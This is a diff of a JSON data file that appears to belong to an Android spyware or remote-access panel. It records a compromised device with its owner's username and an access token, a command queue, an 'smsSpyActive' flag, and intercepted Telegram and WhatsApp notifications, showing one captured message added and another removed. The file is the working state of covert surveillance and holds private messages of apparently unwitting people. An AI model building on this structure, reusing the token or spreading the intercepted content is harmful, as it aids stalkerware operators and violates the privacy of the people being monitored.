@@ -4,7 +4,7 @@
     "deviceName": "HP-KONTOL-4095",
     "ownerUsername": "Ubill_raa",
     "token": "5fab7b001467c4f88275cc7fd6cb0312",
-    "lastSeen": 1777068023355,
+    "lastSeen": 1777068029294,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-24T20:08:51.057Z",
@@ -20,6 +20,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "Telegram",
+        "sender": "ᴄᴏᴡᴡꜱ ᴘᴀʀᴋᴇʀ 🕷️",
+        "content": "Pesan Suara",
+        "time": "25/04 05:00",
+        "pkg": "org.telegram.messenger",
+        "receivedAt": 1777068032071
+      },
       {
         "appName": "Telegram",
         "sender": "𝐒𝐌𝐒𝐏𝐚𝐧𝐞𝐥",
@@ -4011,14 +4019,6 @@
         "time": "25/04 03:17",
         "pkg": "com.whatsapp",
         "receivedAt": 1777061841490
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎𝗖𝗟𝗔𝗬 - 𝟮.𝟬 (3 pesan): ~ mas Anon404",
-        "content": "Menyebut grup Anda secara privat di status",
-        "time": "25/04 03:17",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777061840008
       }
     ],
     "galleryPhotos": [],
